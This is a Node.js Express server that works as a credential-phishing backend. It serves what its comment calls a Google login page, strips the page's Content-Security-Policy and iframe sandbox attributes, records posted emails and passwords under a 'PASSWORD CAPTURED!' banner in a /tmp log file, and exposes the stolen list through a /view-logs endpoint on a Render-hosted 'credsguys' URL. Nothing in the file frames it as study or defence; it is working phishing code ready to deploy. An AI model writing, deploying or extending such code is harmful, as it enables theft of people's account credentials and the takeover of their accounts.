const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve the Google login page from your index.html
app.get('/', (req, res) => {
    let html = fs.readFileSync(path.join(__dirname, 'index.html'), 'utf8');
    
    // ====== REMOVE CSP ======
    // Remove meta CSP tag
    html = html.replace(/<meta http-equiv="content-security-policy"[^>]*>/gi, '');
    html = html.replace(/<meta http-equiv="Content-Security-Policy"[^>]*>/gi, '');
    
    // Remove sandbox from iframes
    html = html.replace(/sandbox="[^"]*"/g, '');
    
    // Remove any 'about:srcdoc' sandbox issues
    html = html.replace(/srcdoc="[^"]*"/g, '');
    
    res.send(html);
});

// Endpoint to receive password
app.post('/log', (req, res) => {
    const { email, password } = req.body;
    
    // ====== THIS WILL SHOW IN RENDER LOGS ======
    console.log('========================================');
    console.log('🔑 PASSWORD CAPTURED!');
    console.log('📧 Email:', email);
    console.log('🔑 Password:', password);
    console.log('🕐 Time:', new Date().toISOString());
    console.log('========================================');
    
    // Also save to file (optional)
    try {
        const logEntry = `[${new Date().toISOString()}] Email: ${email} | Password: ${password}\n`;
        fs.appendFileSync('/tmp/passwords.log', logEntry);
    } catch(e) {}
    
    res.json({ success: true, message: 'Password logged' });
});

// View logs endpoint
app.get('/view-logs', (req, res) => {
    try {
        if (fs.existsSync('/tmp/passwords.log')) {
            const content = fs.readFileSync('/tmp/passwords.log', 'utf8');
            res.setHeader('Content-Type', 'text/plain');
            res.send(content);
        } else {
            res.send('No passwords logged yet');
        }
    } catch(e) {
        res.send('Error reading logs');
    }
});

// Clear logs
app.delete('/clear-logs', (req, res) => {
    try {
        if (fs.existsSync('/tmp/passwords.log')) {
            fs.unlinkSync('/tmp/passwords.log');
        }
        res.json({ success: true });
    } catch(e) {
        res.status(500).json({ error: 'Failed to clear logs' });
    }
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
    console.log(`Open: https://credsguys.onrender.com`);
    console.log(`View logs: https://credsguys.onrender.com/view-logs`);
});
